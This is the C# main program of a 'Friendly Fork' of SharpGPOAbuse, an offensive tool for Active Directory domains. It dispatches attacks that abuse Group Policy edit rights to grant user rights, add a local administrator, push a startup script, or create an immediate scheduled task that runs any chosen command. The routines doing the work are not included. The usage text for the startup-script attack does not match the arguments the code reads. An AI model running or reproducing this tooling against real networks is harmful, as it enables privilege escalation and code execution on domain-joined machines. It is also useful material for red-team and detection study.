using System;
using System.DirectoryServices.ActiveDirectory;
namespace SharpGPOAbuse
{
  class Program
  {
    static void Main(string[] args)
    {

      string GPOName;
      string ScriptName;
      string ScriptContent;
      string UserAccount;
      string[] UserRights;
      string Author;
      string TaskName;
      string Command;
      string Arguments;
      try {
        Domain currentDomain = Domain.GetCurrentDomain();
        string DomainController = currentDomain.PdcRoleOwner.Name.ToLower();
        string DomainName = currentDomain.Name.ToLower();

        string[] DCs;
        string DistinguishedName = "CN=Policies,CN=System";

        Console.WriteLine($"[+] Domain = {DomainName}");
        Console.WriteLine($"[+] Domain Controller = {DomainController}");
        Console.WriteLine($"[+] Distinguished Name = {DistinguishedName}");

        DCs = DomainName.Split('.');

        foreach (string DC in DCs) {
          DistinguishedName += ",DC=" + DC;
        }

        if (args.Length > 0) {
          string AttackName = args[0];
          if (AttackName.ToLower() == "addnewrights") {
            if (args.Length == 4) {

              GPOName = args[1];
              UserAccount = args[2];
              UserRights = args[3].Split(',');
              UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              ListDebugArgs(args, 4);

              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newlocaladmin") {
            if (args.Length == 3) {


              GPOName = args[1];
              UserAccount = args[2];
              LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, false);
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              ListDebugArgs(args, 3);

              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newstartupscript") {
            if (args.Length == 4) {

              GPOName = args[1];
              ScriptName = args[2];
              ScriptContent = args[3];
              StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              ListDebugArgs(args, 4);
              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newimmediatetask") {
            if (args.Length == 6) {

              GPOName = args[1];
              Author = args[2];
              TaskName = args[3];
              Command = args[4];
              Arguments = args[5];
              ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, Arguments, Command, false, "Computer");
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              ListDebugArgs(args, 6);

              PrintHelp();
            }

          } else {
            Console.WriteLine("Unsupported Attack Type! Sorry!");
            PrintHelp();

          }
        } else {
          PrintHelp();
        }
      } catch (Exception e) {
        Console.Error.WriteLine("[!] {0}", e.Message);
      }
    }

    public static void PrintHelp()
    {
      Console.WriteLine("SharpGPOAbuse (Friendly Fork)");
      Console.WriteLine("");
      Console.WriteLine("  AddNewRights:");
      Console.WriteLine("    SharpGPOAbuse.exe AddNewRights [GPOName] [UserAccount] [UserRights CSV]");
      Console.WriteLine("  NewLocalAdmin:");
      Console.WriteLine("    SharpGPOAbuse.exe NewLocalAdmin [GPOName] [UserAccount]");
      Console.WriteLine("  NewStartupScript:");
      Console.WriteLine("    SharpGPOAbuse.exe NewStartupScript [GPOName] [UserAccount] [ScriptContent]");
      Console.WriteLine("  NewImmediateTask:");
      Console.WriteLine("    SharpGPOAbuse.exe NewImmediateTask [GPOName] [Author] [TaskName] [CommandPath] [Arguments]");
    }

    public static void ListDebugArgs(string[] args, int expected)
    {
      Console.WriteLine($"Expected {expected} arguments.");
      int j;
      string arg;
      for (int i = 0; i < args.Length; i++) {
        j = i + 1;
        arg = args[i];
        Console.WriteLine($"Argument {j}: {arg}");
      }
    }
  }
}